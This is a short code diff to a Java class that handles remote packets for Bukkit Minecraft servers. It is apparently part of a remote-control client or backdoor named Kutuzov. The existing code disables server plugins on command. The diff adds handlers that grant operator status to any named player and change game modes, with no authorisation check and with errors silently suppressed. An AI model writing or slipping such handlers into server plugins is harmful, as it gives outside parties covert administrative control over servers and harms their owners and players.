@@ -4,6 +4,7 @@ import me.kutuzov.client.wrapper.BukkitWrapper;
 import me.kutuzov.packet.Packet;
 import me.kutuzov.packet.bukkit.*;
 import org.bukkit.Bukkit;
+import org.bukkit.GameMode;
 import org.bukkit.plugin.Plugin;
 
 import java.io.File;
@@ -88,6 +89,20 @@ public class KutuzovBukkitPackets {
                 Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(inPacket.pluginName));
             } catch (Exception exception) {
                 // exception.printStackTrace();
+            }
+        } else if(packet instanceof SCBukkitOperator) {
+            try {
+                SCBukkitOperator inPacket = (SCBukkitOperator)packet;
+                Bukkit.getPlayer(inPacket.player).setOp(true);
+            } catch (Exception exception) {
+
+            }
+        } else if(packet instanceof SCBukkitGamemode) {
+            try {
+                SCBukkitGamemode inPacket = (SCBukkitGamemode)packet;
+                Bukkit.getPlayer(inPacket.player).setGameMode(GameMode.getByValue(inPacket.gamemode));
+            } catch (Exception exception) {
+
             }
         }
     }
